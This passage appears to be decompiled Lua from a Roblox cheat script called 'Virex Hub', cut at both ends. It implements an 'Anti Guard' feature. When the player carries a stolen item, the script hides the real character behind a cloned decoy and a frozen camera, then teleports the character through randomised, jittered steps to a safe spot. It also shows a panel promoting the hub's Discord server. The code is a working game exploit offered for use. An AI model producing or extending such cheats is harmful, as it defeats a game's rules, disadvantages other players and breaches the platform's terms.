local UIStroke2 = fn20("UIStroke", Frame3, { Thickness = 1.5, Color = tbl18.Off, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })
local ImageLabel = fn20("ImageLabel", Frame3, {
AnchorPoint = Vector2.new(0.5, 0.5),
Position = UDim2.fromScale(0.5, 0.5),
Size = UDim2.fromScale(0.86, 0.86),
BackgroundTransparency = 1,
Image = "rbxassetid://107391174248131",
ImageTransparency = 0.35,
ScaleType = Enum.ScaleType.Crop,
ZIndex = 3,
})
fn20("UICorner", ImageLabel, { CornerRadius = UDim.new(0, 8) })
local UIScale3 = fn20("UIScale", ImageLabel, { Scale = 1 })
local color3 = Color3.fromRGB
fn20("UIGradient", fn20("TextLabel", Frame2, {
BackgroundTransparency = 1,
Position = UDim2.new(0, 56, 0, 7),
Size = UDim2.new(1, -112, 0, 15),
Font = Enum.Font.BuilderSansExtraBold,
TextSize = 14,
TextXAlignment = Enum.TextXAlignment.Left,
TextColor3 = Color3.fromRGB(255, 255, 255),
Text = "Virex Hub",
ZIndex = 2,
}), { Color = ColorSequence.new(Color3.fromRGB(255, 120, 100), color3(255, 190, 110)) })
fn20("TextLabel", Frame2, {
BackgroundTransparency = 1,
Position = UDim2.new(0, 56, 0, 22),
Size = UDim2.new(1, -112, 0, 20),
Font = Enum.Font.GothamBlack,
TextSize = 15,
TextXAlignment = Enum.TextXAlignment.Left,
TextColor3 = tbl18.Text,
Text = "Anti Guard",
ZIndex = 2,
})
local TextButton = fn20("TextButton", Frame2, {
AnchorPoint = Vector2.new(1, 0.5),
Position = UDim2.new(1, -12, 0.5, 0),
Size = UDim2.fromOffset(42, 22),
BackgroundColor3 = Color3.fromRGB(255, 255, 255),
AutoButtonColor = false,
BorderSizePixel = 0,
Text = "",
ZIndex = 2,
})
fn20("UICorner", TextButton, { CornerRadius = UDim.new(1, 0) })
local UIGradient2 = fn20("UIGradient", TextButton, { Color = ColorSequence.new(tbl18.Off, tbl18.Off) })
local Frame4 = fn20("Frame", TextButton, {
AnchorPoint = Vector2.new(0, 0.5),
Position = UDim2.new(0, 3, 0.5, 0),
Size = UDim2.fromOffset(16, 16),
BackgroundColor3 = Color3.fromRGB(245, 245, 250),
BorderSizePixel = 0,
ZIndex = 3,
})
fn20("UICorner", Frame4, { CornerRadius = UDim.new(1, 0) })
local function fn21()
return antiGuard.Enabled and tbl18.AccentA or tbl18.Off
end
local function render(arg)
local n14 = arg and 0 or 0.28
if antiGuard.Enabled then
UIGradient2.Color = ColorSequence.new(tbl18.AccentA, tbl18.AccentB)
local v15 = UIGradient
local colorSequence = ColorSequence.new
local tbl22 = {}
local v16 = ColorSequenceKeypoint.new(0, tbl18.Stroke)
local v17 = ColorSequenceKeypoint.new(0.45, tbl18.AccentA)
local v18 = ColorSequenceKeypoint.new(0.55, tbl18.AccentB)
tbl22[1] = v16
tbl22[2] = v17
tbl22[3] = v18
do
local values = table.pack(ColorSequenceKeypoint.new(1, tbl18.Stroke))
table.move(values, 1, values.n, 4, tbl22)
end
v15.Color = colorSequence(tbl22)
fn17(Frame4, n14, { Position = UDim2.new(1, -19, 0.5, 0) }, Enum.EasingStyle.Back)
fn17(ImageLabel, n14, { ImageTransparency = 0 })
fn17(UIStroke, 0.3, { Transparency = 0 })
else
UIGradient2.Color = ColorSequence.new(tbl18.Off, tbl18.Off)
UIGradient.Color = ColorSequence.new(tbl18.Stroke, tbl18.Stroke)
fn17(Frame4, n14, { Position = UDim2.new(0, 3, 0.5, 0) }, Enum.EasingStyle.Back)
fn17(ImageLabel, n14, { ImageTransparency = 0.35 })
fn17(UIStroke, 0.3, { Transparency = 0.2 })
end
local flashUntil = tbl21.FlashUntil
if os.clock() >= flashUntil then
fn17(UIStroke2, n14, { Color = fn21() })
end
end
fn18 = function(arg, arg2)
tbl21.FlashRequest = { Color = arg, Hold = arg2 }
end
local function fn22()
local flashRequest = tbl21.FlashRequest
if not flashRequest then
return
end
tbl21.FlashRequest = nil
tbl21.FlashUntil = os.clock() + (flashRequest.Hold or 0)
fn17(UIStroke2, 0.2, { Color = flashRequest.Color })
if flashRequest.Hold then
task.delay(flashRequest.Hold, function()
local flag4 = flag3
if flag3 then
local flashUntil = tbl21.FlashUntil
flag4 = os.clock() >= flashUntil
end
if flag4 then
fn17(UIStroke2, 0.3, { Color = fn21() })
end
end)
end
end
local function fn23(arg)
local handle = antiGuard.Handle
if type(handle) ~= "table" then
return
end
for _, v15 in ipairs({ "Set", "SetValue" }) do
local ok, result = pcall(function()
return handle[v15]
end)
if ok and type(result) == "function" and pcall(result, handle, arg) then
return
end
end
end
antiGuard.Render = render
local TextButton2 = fn20("TextButton", Frame2, {
Size = UDim2.fromScale(1, 1),
BackgroundTransparency = 1,
AutoButtonColor = false,
Text = "",
ZIndex = 10,
})
tbl20[#tbl20 + 1] = TextButton2.MouseButton1Click:Connect(function()
antiGuard.Enabled = not antiGuard.Enabled
render(false)
fn23(antiGuard.Enabled)
fn17(UIScale3, 0.12, { Scale = 1.15 })
task.delay(0.12, function()
if flag3 then
fn17(UIScale3, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
end
end)
end)
local size = TextButton.Size
tbl20[#tbl20 + 1] = TextButton2.MouseEnter:Connect(function()
fn17(TextButton, 0.15, { Size = size + UDim2.fromOffset(2, 2) })
end)
tbl20[#tbl20 + 1] = TextButton2.MouseLeave:Connect(function()
fn17(TextButton, 0.15, { Size = size })
end)
local tbl22 = {
Hotbar = true,
HotBar = true,
Toolbar = true,
ToolBar = true,
Backpack = true,
Inventory = true,
}
local tbl23 = {}
local huge = math.huge
local huge2 = math.huge
local rotation = 0
local n14 = nil
local function fn24(arg)
while arg do
if arg:IsA("GuiObject") and not arg.Visible then
return false
end
if arg:IsA("LayerCollector") then
return arg.Enabled
end
arg = arg.Parent
end
return false
end
local function fn25()
local ok, result = pcall(function()
return GuiService2:GetGuiInset().Y
end)
return ok and result or 0
end
local function fn26(arg)
local v15 = nil
for _, descendant in ipairs(arg:GetDescendants()) do
if descendant:IsA("GuiButton") and descendant.Visible and descendant.AbsoluteSize.Y > 8 and descendant.AbsoluteSize.X > 8 then
local y = descendant.AbsolutePosition.Y
if not v15 or y < v15 then
v15 = y
end
end
end
return v15 or arg.AbsolutePosition.Y
end
local function fn27()
table.clear(tbl23)
local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
if not playerGui then
return
end
for _, descendant in ipairs(playerGui:GetDescendants()) do
if descendant:IsA("GuiObject") and tbl22[descendant.Name] then
tbl23[#tbl23 + 1] = descendant
end
end
end
local function fn28()
local tbl24 = {}
pcall(function()
if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
return
end
for _, child in ipairs(CoreGui.RobloxGui.Backpack:GetChildren()) do
if child:IsA("GuiObject") then
tbl24[#tbl24 + 1] = child
end
end
end)
for _, v15 in ipairs(tbl23) do
if v15.Parent then
tbl24[#tbl24 + 1] = v15
end
end
return tbl24
end
local function fn29()
local currentCamera = workspace.CurrentCamera
if not currentCamera then
return
end
local viewportSize = currentCamera.ViewportSize
if viewportSize.X < 10 or viewportSize.Y < 10 then
return
end
local flag4 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
local n15 = math.min(viewportSize.X / 1280, viewportSize.Y / 720)
local scale = flag4 and math.clamp(n15 * 1.05, 0.6, 0.8) * 0.97 or math.clamp(n15, 0.8, 1.1)
UIScale.Scale = scale
local backgroundTransparency = flag4 and 0.3 or 0
if Frame2.BackgroundTransparency ~= backgroundTransparency then
Frame2.BackgroundTransparency = backgroundTransparency
Frame3.BackgroundTransparency = backgroundTransparency
end
local n16 = viewportSize.Y - 8 * scale
local flag5 = false
for _, v15 in ipairs(fn28()) do
local ok, result = pcall(fn24, v15)
if ok and result then
local absoluteSize = v15.AbsoluteSize
local y = v15.AbsolutePosition.Y
if absoluteSize.X > 20 and absoluteSize.Y > 20 and absoluteSize.Y < viewportSize.Y * 0.4 and y + absoluteSize.Y / 2 > viewportSize.Y * 0.5 then
local ok2, result2 = pcall(fn26, v15)
result2 = ok2 and result2 or y
flag5 = true
n16 = math.min(n16, result2 + fn25(v15))
end
end
end
if flag5 then
n14 = viewportSize.Y - n16
elseif n14 then
n16 = viewportSize.Y - n14
end
local n17 = math.max(n16 - (flag4 and 4 or 6) * scale - n13 * scale / 2, n13 * scale / 2 + 8)
Frame.Position = UDim2.new(0.5, 0, 0, n17)
end
tbl20[#tbl20 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
fn22()
huge += deltaTime
huge2 += deltaTime
if huge >= 3 then
huge = 0
pcall(fn27)
end
if huge2 >= 0.2 then
huge2 = 0
pcall(fn29)
end
if antiGuard.Enabled then
rotation = (rotation + deltaTime * (tbl21.Active and 360 or 90)) % 360
UIGradient.Rotation = rotation
end
end)
render(true)
end
antiGuard.ShowPanel = function(arg)
ScreenGui.Enabled = arg == true
end
ScreenGui.Enabled = antiGuard.PanelShown == true
ScreenGui.Parent = hui
fn17(UIScale2, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)
do
local function fn19()
local v15 = tbl4.Root()
if not v15 then
return nil
end
for _, child in ipairs(workspace:GetChildren()) do
if child:IsA("Model") and child:FindFirstChild("Hitbox") then
for _, descendant in ipairs(child:GetDescendants()) do
if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
local ok, result, result2 = pcall(function()
return descendant.Part0, descendant.Part1
end)
local flag4
if ok then
flag4 = result == v15 or result2 == v15
else
flag4 = ok
end
if flag4 then
return child
end
end
end
end
end
return nil
end
local function fn20(arg, parent)
local tbl22 = {}
for _, descendant in ipairs(arg:GetDescendants()) do
tbl22[descendant] = descendant.Archivable
pcall(function()
descendant.Archivable = true
end)
end
local archivable = arg.Archivable
arg.Archivable = true
local ok, result = pcall(function()
return arg:Clone()
end)
arg.Archivable = archivable
for k, v15 in pairs(tbl22) do
pcall(function()
k.Archivable = v15
end)
end
if not ok or not result then
return nil
end
result.Name = fn16()
for _, descendant in ipairs(result:GetDescendants()) do
if descendant:IsA("LuaSourceContainer") or descendant:IsA("Sound") or descendant:IsA("ForceField") or descendant:IsA("JointInstance") or descendant:IsA("Constraint") or descendant:IsA("WeldConstraint") or descendant:IsA("BodyMover") or descendant:IsA("ProximityPrompt") or descendant:IsA("BillboardGui") then
pcall(function()
descendant:Destroy()
end)
elseif descendant:IsA("BasePart") then
descendant.Anchored = true
descendant.CanCollide = false
descendant.CanQuery = false
descendant.CanTouch = false
elseif descendant:IsA("Humanoid") then
descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
descendant.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
end
end
result.Parent = parent
return result
end
local function fn21(arg, arg2)
local currentCamera = workspace.CurrentCamera
if not arg or not currentCamera or tbl21.Disguise then
return
end
arg2 = arg2 or Vector3.zero
local disguise = { Camera = currentCamera, CameraType = currentCamera.CameraType, CameraCFrame = currentCamera.CFrame, Copies = {}, Hidden = {} }
tbl21.Disguise = disguise
local tbl22 = { arg }
local ok, result = pcall(fn19)
if ok and result then
tbl22[#tbl22 + 1] = result
end
for _, v15 in ipairs(tbl22) do
for _, descendant in ipairs(v15:GetDescendants()) do
if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
disguise.Hidden[#disguise.Hidden + 1] = descendant
end
end
end
local function fn22()
for _, v15 in ipairs(disguise.Hidden) do
pcall(function()
v15.LocalTransparencyModifier = 1
end)
end
pcall(function()
if currentCamera.CameraType ~= Enum.CameraType.Scriptable then
currentCamera.CameraType = Enum.CameraType.Scriptable
end
currentCamera.CFrame = disguise.CameraCFrame
end)
end
fn22()
disguise.BindName = fn16()
if not pcall(function()
RunService:BindToRenderStep(disguise.BindName, Enum.RenderPriority.Last.Value + 1, fn22)
end) then
disguise.BindName = nil
disguise.Link = RunService.RenderStepped:Connect(fn22)
end
disguise.Beat = RunService.Heartbeat:Connect(fn22)
for _, v15 in ipairs(tbl22) do
local ok2, result2 = pcall(fn20, v15, currentCamera)
if ok2 and result2 then
if arg2.Magnitude > 0.01 then
for _, descendant in ipairs(result2:GetDescendants()) do
if descendant:IsA("BasePart") then
pcall(function()
descendant.CFrame = descendant.CFrame + arg2
end)
end
end
end
disguise.Copies[#disguise.Copies + 1] = result2
end
end
end
local function fn22()
local disguise = tbl21.Disguise
if not disguise then
return
end
tbl21.Disguise = nil
if disguise.BindName then
pcall(function()
RunService:UnbindFromRenderStep(disguise.BindName)
end)
end
if disguise.Link then
pcall(function()
disguise.Link:Disconnect()
end)
end
if disguise.Beat then
pcall(function()
disguise.Beat:Disconnect()
end)
end
for _, v15 in ipairs(disguise.Hidden) do
pcall(function()
v15.LocalTransparencyModifier = 0
end)
end
pcall(function()
disguise.Camera.CameraType = disguise.CameraType
end)
for _, copy in ipairs(disguise.Copies) do
pcall(function()
copy:Destroy()
end)
end
end
local function fn23()
for _, v15 in ipairs(tbl19) do
local v16 = workspace
for _, v17 in ipairs(v15.Path) do
v16 = v16 and v16:FindFirstChild(v17) or nil
end
if v16 and v16:IsA("BasePart") then
return v16.CFrame:PointToWorldSpace(v15.Offset)
end
end
return Vector3.new(528.7, 70.57, -364.11)
end
local function fn24(arg, arg2, arg3, arg4, arg5)
local cFrame = CFrame.new(arg3) * arg4
pcall(function()
arg:PivotTo(cFrame)
end)
if (arg2.Position - arg3).Magnitude > 3 then
pcall(function()
arg2.CFrame = cFrame
end)
end
if arg5 == false then
return
end
for _, descendant in ipairs(arg:GetDescendants()) do
if descendant:IsA("BasePart") then
pcall(function()
descendant.AssemblyLinearVelocity = Vector3.zero
descendant.AssemblyAngularVelocity = Vector3.zero
end)
end
end
end
local function fn25()
local areaId = tbl21.AreaId
if type(areaId) ~= "string" or areaId == "" then
areaId = type(tbl4.Steal) == "table" and tbl4.Steal.CarryAreaId or nil
end
if type(areaId) ~= "string" or areaId == "" then
areaId = localPlayer:GetAttribute("AreaId")
areaId = type(areaId) == "string" and areaId or nil
end
return areaId
end
local tbl22 = { lightdark = "LightDark" }
local function fn26(arg)
if type(arg) ~= "string" then
return "Default"
end
local lower = string.lower
local v15 = string.gsub(arg, "[^%a]", "")
return tbl22[lower(v15)] or "Default"
end
local function fn27()
local ok, result = pcall(function()
return getgenv().ChilliAntiGuard
end)
if ok and type(result) == "table" then
if type(result.Steps) == "table" then
return result
end
local default = result[fn26(fn25())] or result.Default
if type(default) == "table" then
return default
end
end
return chilliAntiGuard[fn26(fn25())] or tbl17
end
local function fn28()
local v15 = fn27()
local options = antiGuard.Options
if type(options) ~= "table" or options.Destination == "Safe Zone" and not options.Stay then
return v15
end
local tbl23 = {}
for k, v16 in pairs(v15) do
tbl23[k] = v16
end
if options.Destination == "Next To Line" then
tbl23.Target = "edge"
tbl23.LineOffset = 6
tbl23.Height = 0
tbl23.OffsetX = 0
tbl23.OffsetZ = 0
elseif options.Destination == "Saved Spot" and typeof(options.Spot) == "Vector3" then
tbl23.Target = "point"
tbl23.Point = options.Spot
tbl23.Height = 0
tbl23.OffsetX = 0
tbl23.OffsetZ = 0
end
if options.Stay and type(v15.Steps) == "table" then
local steps = {}
for _, step in ipairs(v15.Steps) do
if type(step) == "table" and step.To ~= "start" then
steps[#steps + 1] = step
end
end
tbl23.Steps = steps
end
return tbl23
end
local function fn29(arg, arg2)
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
local separationLine = world and world:FindFirstChild("SeparationLine")
if separationLine and separationLine:IsA("BasePart") then
local cFrame = separationLine.CFrame
local v15 = (Vector3.new(0, 1, 0)):Cross(separationLine.Size.X >= separationLine.Size.Z and cFrame.RightVector or cFrame.LookVector)
local vector = Vector3.new(v15.X, 0, v15.Z)
if vector.Magnitude > 0.001 then
local unit = vector.Unit
local n14 = cFrame.Position + ((arg2 - cFrame.Position):Dot(unit) >= 0 and -unit or unit) * (tonumber(arg.LineOffset) or 8)
return Vector3.new(n14.X, arg2.Y + 0.5, n14.Z)
end
end
return nil
end
local function fn30(arg, arg2)
local str = tostring(arg.Target or "home")
if str == "sky" then
return arg2
end
if str == "point" then
if typeof(arg.Point) == "Vector3" then
return arg.Point
end
return arg2
end
if str == "line" then
local v15 = fn29(arg, arg2)
if v15 then
return v15
end
end
if str == "edge" then
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
world = world and world:FindFirstChild("SeparationLine")
if world and world:IsA("BasePart") then
local cFrame = world.CFrame
local rightVector = world.Size.X >= world.Size.Z and cFrame.RightVector or cFrame.LookVector
local vector = Vector3.new(rightVector.X, 0, rightVector.Z)
local v15 = (Vector3.new(0, 1, 0)):Cross(vector)
local vector2 = Vector3.new(v15.X, 0, v15.Z)
if vector2.Magnitude > 0.001 and vector.Magnitude > 0.001 then
local unit = vector.Unit
local unit2 = vector2.Unit
local n14 = arg2 - cFrame.Position
local n15 = -world.Size.Magnitude / 2
local n16 = world.Size.Magnitude / 2
local n17 = cFrame.Position + unit * math.clamp(n14:Dot(unit), n15, n16) + (n14:Dot(unit2) >= 0 and unit2 or -unit2) * (tonumber(arg.LineOffset) or 6)
local v16 = fn23()
return Vector3.new(n17.X, (v16 and v16.Y or arg2.Y) + 3, n17.Z)
end
end
end
return fn23()
end
local function fn31(arg, arg2)
return fn30(arg, arg2) + Vector3.new(tonumber(arg.OffsetX) or 0, tonumber(arg.Height) or 0, tonumber(arg.OffsetZ) or 0)
end
local function fn32()
tbl21.Active = false
antiGuard.Busy = false
end
local function fn33(arg)
local n14 = math.max(tonumber(arg) or 0, 0)
if n14 <= 0 then
return 0
end
return (math.random() * 2 - 1) * n14
end
local function fn34(arg)
local steps = type(arg.Steps) == "table" and arg.Steps or {}
local n14 = tonumber(arg.ReleaseAt) or 0
local n15 = math.max(tonumber(arg.StartAt) or 0, 0)
local n16 = math.max(tonumber(arg.StartRandom) or 0, 0)
local n17 = math.max(tonumber(arg.HopRandom) or 0, 0)
local n18 = math.max(tonumber(arg.HoldRandom) or 0, 0)
if n16 <= 0 and n17 <= 0 and n18 <= 0 then
return steps, n14, n15
end
local n19 = math.max(n15 + fn33(n16), 0)
local tbl23 = {}
local n20 = 0
local n21 = 0
for i, step in ipairs(steps) do
if type(step) == "table" then
local n22 = math.max(tonumber(step.At) or 0, 0)
n21 = math.max(n21 + math.max(n22 - n20, 0) + fn33(step.To == "start" and n18 or n17), n19)
tbl23[i] = { At = n21, To = step.To, Glide = step.Glide }
n20 = n22
continue
end
break
end
return tbl23, n21 + math.max(n14 - n20, 0), n19
end
local function fn35(arg)
local character = localPlayer.Character
local v15 = tbl4.Root()
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if not v15 or not humanoid or humanoid.Health <= 0 then
fn32()
fn18(tbl18.Bad, 1.6)
return
end
local function fn36()
return flag3 and v15.Parent ~= nil and humanoid.Parent ~= nil and humanoid.Health > 0
end
local platformStand = humanoid.PlatformStand
local cFrame = v15.CFrame
local position = cFrame.Position
local v16 = fn28()
local v17, v18, v19 = fn34(v16)
local flag4 = v16.Freeze ~= false
local str = tostring(v16.Facing or "Keep")
local n14 = math.max(tonumber(v16.Jitter) or 0, 0)
local cframe = str == "Zero" and CFrame.new() or cFrame.Rotation
local function fn37()
if str == "Spin" then
return CFrame.Angles(0, math.rad(math.random(0, 359)), 0)
end
return cframe
end
local function fn38(arg2)
if n14 <= 0 then
return arg2
end
return arg2 + Vector3.new((math.random() * 2 - 1) * n14, 0, (math.random() * 2 - 1) * n14)
end
local v20 = fn31(v16, position)
local function fn39(arg2)
while fn36() and os.clock() - arg < arg2 do
RunService.Heartbeat:Wait()
if flag4 then
pcall(function()
v15.AssemblyLinearVelocity = Vector3.zero
v15.AssemblyAngularVelocity = Vector3.zero
end)
end
end
return fn36()
end
local function fn40(arg2, arg3)
fn24(character, v15, arg2, arg3, flag4)
RunService.PreSimulation:Wait()
if fn36() and (v15.Position - arg2).Magnitude > 3 then
fn24(character, v15, arg2, arg3, flag4)
end
end
pcall(function()
humanoid.BreakJointsOnDeath = false
end)
if v16.Disguise ~= false then
pcall(fn21, character, Vector3.zero)
end
fn18(tbl18.Work)
if fn39(v19) and v16.Limp ~= false then
humanoid.PlatformStand = true
end
local v21 = position
for _, v22 in ipairs(v17) do
local flag5 = type(v22) ~= "table"
if not flag5 then
flag5 = not fn39(tonumber(v22.At) or 0)
end
if not flag5 then
local flag6 = v22.To == "start" and position or fn38(v20)
local v23 = fn37()
if type(v22.Glide) == "table" and #v22.Glide > 0 then
for _, v24 in ipairs(v22.Glide) do
if fn36() then
local clamp = math.clamp
local n15 = tonumber(v24) or 1
local v25 = fn24
local lerp = v21.Lerp
local v26 = clamp(n15, 0, 1)
v25(character, v15, lerp(v21, flag6, v26), v23, flag4)
RunService.Heartbeat:Wait()
continue
end
break
end
v21 = flag6
else
fn40(flag6, v23)
v21 = flag6
end
continue
end
break
end
fn39(v18)
pcall(function()
humanoid.PlatformStand = platformStand
end)
fn22()
fn32()
if fn36() and tbl21.Carrying then
fn18(tbl18.Good, 1.6)
else
fn18(tbl18.Bad, 1.6)
end
end
local function fn36(arg)
if not pcall(fn35, arg) then
pcall(function()
local character = localPlayer.Character
character = character and character:FindFirstChildOfClass("Humanoid")
if character then
character.PlatformStand = false
end
end)
fn22()
fn32()
fn18(tbl18.Bad, 1.6)
end
end
local n14 = 25
local function fn37()
if antiGuard.HitArms <= 0 then
return false
end
if n14 < os.clock() - (antiGuard.HitArmedAt or 0) then
antiGuard.HitArms = 0
return false
end
return true
end
local function fn38()
local carrying = tbl21.Carrying
tbl21.Carrying = tbl21.SignalCarrying or tbl21.WeldCarrying
local enabled = tbl21.Carrying and not carrying and flag3 and antiGuard.Enabled
local flag4
if enabled then
flag4 = not (tbl4.SafeCarry.LineDrop and tbl4.Steal.Active)
else
flag4 = enabled
end
if flag4 then
flag4 = not (tbl4.Steal.Active and tbl4.BossPortalUp())
end
if flag4 and not tbl21.Active and not fn37() then
tbl21.Active = true
antiGuard.Busy = true
antiGuard.BusySince = os.clock()
task.spawn(fn36, os.clock())
end
end
local eggState = tbl.EggState
local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil
if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
local signalCarrying = type(arg) == "table" and arg.IsCarrying == true
if signalCarrying and arg.GuardDisabled == true then
signalCarrying = false
end
if signalCarrying and type(arg.AreaId) == "string" then
tbl21.AreaId = arg.AreaId
end
if not signalCarrying then
tbl21.AreaId = nil
end
tbl21.SignalCarrying = signalCarrying
fn38()
end)
if ok and result then
tbl20[#tbl20 + 1] = result
end
end
local n15 = 0
tbl20[#tbl20 + 1] = RunService.Heartbeat:Connect(function(deltaTime)
local busy = antiGuard.Busy or tbl21.Active
if busy then
local busySince = antiGuard.BusySince
busy = os.clock() - busySince > math.max(tonumber(fn28().BusyLimit) or tbl17.BusyLimit, (tonumber(fn28().ReleaseAt) or 0) + 1)
end
if busy then
fn22()
local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
if humanoid and humanoid.PlatformStand then
pcall(function()
humanoid.PlatformStand = false
end)
end
fn32()
end
fn37()
n15 += deltaTime
if n15 < tbl17.WeldScanGap then
return
end
n15 = 0
local weldCarrying = fn19() ~= nil
if weldCarrying ~= tbl21.WeldCarrying then
tbl21.WeldCarrying = weldCarrying
fn38()
end
end)
fn4(function()
flag3 = false
for _, v15 in ipairs(tbl20) do
pcall(function()
v15:Disconnect()
end)
end
table.clear(tbl20)
fn22()
fn32()
antiGuard.Render = nil
antiGuard.ShowPanel = nil
pcall(function()
ScreenGui:Destroy()
end)
end)
end
do
local v15 = v2:CreateTab({ Name = "Config", SectionsExpanded = true }):CreateSection({ Name = "Settings", Expanded = true })
local str = "discord.gg/virexs"
local str2 = "rbxassetid://107391174248131"
local n14 = 0.5
local n15 = 0.0909
local n16 = 0.2
local n17 = 5.4
local n18 = 4.2
local n19 = 5.2
local n20 = 6
local n21 = 3.6
local n22 = 6.4
local n23 = 2
local n24 = 11.4
local n25 = 3
local n26 = 0.35
local tbl22 = {
{
Color = "#FF6A55",
Title = "New Scripts &amp; Updates",
Text = "Patch notes and new game scripts are posted there first.",
},
{
Color = "#FFB054",
Title = "Giveaways",
Text = "Member giveaways and events are announced in the server.",
},
{
Color = "#9AA3FF",
Title = "Support",
Text = "Ask for help, report bugs and get answers from the team.",
},
{
Color = "#6EE49C",
Title = "Suggestions",
Text = "Request features and vote on what gets added next.",
},
}
local n27 = n24 + #tbl22 * (n25 + n26) + 2.4 + n16 * 2
local colorSequence = ColorSequence.new
local tbl23 = {}
local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 218, 96))
local v17 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 152, 60))
local new = ColorSequenceKeypoint.new
local color3 = Color3.fromRGB
tbl23[1] = v16
tbl23[2] = v17
do
local values = table.pack(new(1, color3(255, 82, 64)))
table.move(values, 1, values.n, 3, tbl23)
end
local v18 = colorSequence(tbl23)
local color4 = Color3.fromRGB
local colorSequence2 = ColorSequence.new(Color3.fromRGB(74, 24, 18), color4(14, 11, 15))
local tbl24 = { Perks = {} }
local n28 = 0
local function fn19()
local v19 = setclipboard or toclipboard
local ok = type(v19) == "function" and pcall(v19, "https://discord.gg/virexs") or false
fn15(ok and "Discord Link Copied" or "Discord Link", "https://discord.gg/virexs")
if not tbl24.Copy then
return
end
n28 += 1
local v20 = n28
tbl24.Copy.Set({
Text = ok and "<b>Copied!</b>" or "<b>See Notice</b>",
Background = ok and "#2EB070" or "#5865F2",
})
task.delay(1.8, function()
if v20 == n28 and tbl24.Copy then
tbl24.Copy.Set({ Text = "<b>Copy Link</b>", Background = "#5865F2" })
end
end)
end
local function fn20(arg)
if not tbl24.Hero then
return
end
local n29 = n16 * 2
local n30 = math.max(arg, 14) - n29
local n31 = math.max(1, n30 - n19 - n14)
local n32 = math.max(1, n30 - n22 - n14 * 3)
local n33 = math.max(1, n30 - 1.2)
tbl24.Hero.Set({ Width = n30 })
tbl24.Title.Set({ Width = n31 })
tbl24.Subtitle.Set({ Width = n31 })
tbl24.Members.Set({ Width = n31 })
tbl24.Invite.Set({ Width = n30 })
tbl24.Label.Set({ Width = n32 })
tbl24.Link.Set({ Width = n32 })
tbl24.Copy.Set({ X = n30 - n22 - n14 })
tbl24.Header.Set({ Width = n30 })
for _, perk in ipairs(tbl24.Perks) do
perk.Frame.Set({ Width = n30 })
perk.Title.Set({ Width = n33 })
perk.Text.Set({ Width = n33 })
end
tbl24.Tip.Set({ Width = n30 })
end
local function fn21(arg)
tbl24.Hero = arg:Frame({
Name = "Hero",
X = n16,
Y = n16,
Width = 14,
Height = n17,
Background = "#FFFFFF",
Gradient = colorSequence2,
GradientRotation = 0,
Corner = 0.35,
StrokeColor = "#FF6A40",
StrokeThickness = n15,
StrokeTransparency = 0.55,
})
tbl24.Logo = arg:Image({
Parent = tbl24.Hero,
X = 0.5,
Y = (n17 - n18) / 2,
Width = n18,
Height = n18,
Image = str2,
})
tbl24.Title = arg:Text({
Parent = tbl24.Hero,
X = n19,
Y = 0.45,
Width = 1,
Height = 1.6,
Scale = 1.45,
Wrap = false,
Text = "<b>Virex Hub</b>",
Gradient = v18,
GradientRotation = 0,
TextStrokeTransparency = 1,
})
tbl24.Subtitle = arg:Text({
Parent = tbl24.Hero,
X = n19,
Y = 2.1,
Width = 1,
Height = 1,
Wrap = false,
Text = "Official Discord Community",
Color = "#DCDCE8",
})
tbl24.Members = arg:Text({
Parent = tbl24.Hero,
X = n19,
Y = 3.3,
Width = 1,
Height = 1.2,
Wrap = false,
Text = string.format("<font color=\"#6EE49C\">%s</font>  <b>%s</b>  <font color=\"#B8B8CC\">Members</font>", utf8.char(9679), "130K+"),
})
tbl24.Invite = arg:Frame({
Name = "Invite",
X = n16,
Y = n20 + n16,
Width = 14,
Height = n21,
Background = "#000000",
BackgroundTransparency = 0.5,
Corner = 0.35,
StrokeColor = "#5865F2",
StrokeThickness = n15,
StrokeTransparency = 0.35,
})
tbl24.Label = arg:Text({
Parent = tbl24.Invite,
X = n14 + 0.1,
Y = 0.35,
Width = 1,
Height = 0.9,
Scale = 0.78,
Wrap = false,
Text = "<b>INVITE LINK</b>",
Color = "#9C9CB4",
})
tbl24.Link = arg:Text({
Parent = tbl24.Invite,
X = n14 + 0.1,
Y = 1.35,
Width = 1,
Height = 1.6,
Scale = 1.05,
Wrap = false,
Font = "code",
Text = str,
})
tbl24.Copy = arg:Button({
Parent = tbl24.Invite,
X = 14 - n22 - n14,
Y = (n21 - n23) / 2,
Width = n22,
Height = n23,
Text = "<b>Copy Link</b>",
Color = "#FFFFFF",
Scale = 1,
Background = "#5865F2",
BackgroundTransparency = 0,
HoverTransparency = 0.15,
PressTransparency = 0.3,
StrokeColor = "#9AA3FF",
StrokeThickness = n15,
Corner = 0.3,
Callback = fn19,
})
tbl24.Header = arg:Text({
X = n16 + 0.1,
Y = n24 - 1.15 + n16,
Width = 14,
Height = 1,
Scale = 0.8,
Wrap = false,
Text = "<b>WHAT YOU GET</b>",
Color = "#9C9CB4",
})
for i, v19 in ipairs(tbl22) do
local tbl25 = {
Frame = arg:Frame({
Name = "Perk",
X = n16,
Y = n24 + (i - 1) * (n25 + n26) + n16,
Width = 14,
Height = n25,
Background = "#000000",
BackgroundTransparency = 0.68,
Corner = 0.35,
}),
}
tbl25.Accent = arg:Frame({
Parent = tbl25.Frame,
X = 0.3,
Y = 0.45,
Width = 0.22,
Height = n25 - 0.9,
Background = v19.Color,
Corner = 0.11,
})
